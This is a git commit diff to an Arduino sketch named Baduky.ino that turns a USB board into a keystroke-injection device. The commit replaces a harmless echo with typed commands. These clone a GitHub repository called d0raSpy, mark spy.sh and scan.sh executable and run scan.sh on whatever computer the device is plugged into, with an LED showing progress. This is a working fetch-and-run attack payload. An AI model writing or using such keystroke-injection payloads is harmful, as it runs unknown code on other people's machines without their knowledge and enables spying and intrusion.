48b64b12d3574a58bc8af897074609069a19a02d
nouseramefounded <100087356+nouseramefounded@users.noreply.github.com>
2023-04-22 13:40:30 +0200

    Update Baduky.ino

--- Baduky/Baduky.ino
+++ Baduky/Baduky.ino
@@ -1,5 +1,8 @@
 #include <Keyboard.h>
 void setup() {
+  pinMode(LED_BUILTIN, OUTPUT);
+  //Start blink led on start
+  digitalWrite(LED_BUILTIN, HIGH);   
   Keyboard.begin();
   delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
@@ -11,11 +14,18 @@ void setup() {
   delay(10);
   Keyboard.releaseAll();
   delay(1000);
-  Keyboard.print("echo 'Weeeilaaa'");
+  Keyboard.print("git clone https://github.com/nouseramefounded/d0raSpy.git");
   delay(200);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(200);
-  Keyboard.end();
+  Keyboard.print("cd d0raSpy/ && chmod +x spy.sh && chmod +x scan.sh && ./scan.sh ");
+  delay(200);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(200);
+  Keyboard.end(); 
+  //Stop blink led on stop                    
+  digitalWrite(LED_BUILTIN, LOW);    
 }
 void loop() {}
